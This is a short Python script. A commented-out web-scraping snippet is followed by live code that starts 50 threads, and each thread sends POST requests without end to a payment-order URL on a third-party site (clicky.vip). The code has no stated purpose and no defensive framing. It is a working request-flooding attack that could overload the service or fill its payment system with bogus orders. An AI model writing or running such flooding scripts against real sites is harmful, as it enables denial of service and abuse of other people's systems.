# import requests
# from bs4 import BeautifulSoup


# url = 'https://firstround.com/companies/'

# web_to_scrape = requests.get(url)

# soup = BeautifulSoup(web_to_scrape.content, "html.parser")


# # print(web_to_scrape.text, "html.parser")

# header = soup.find("div", attrs={"class":"intro-text-block"})
# print(header.text)


import requests
import threading

url = 'https://www.clicky.vip/index/pay/PKPAY?num=300000&id=96&payer_name=&payer_bank=&payer_cardno=&payer_name=&payer_mobile=&payer_upi=&payer_email=&vip_id=undefined&type=0'


data = {
    
}

def do_request():
    while True:
        response =  requests.post(url, data = data).text
        print(response)
        
        
threads = []


for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)
    
    
for i in range(50):
    threads[i].start()
    
    
for i in range(50):
    threads[i].join()
    
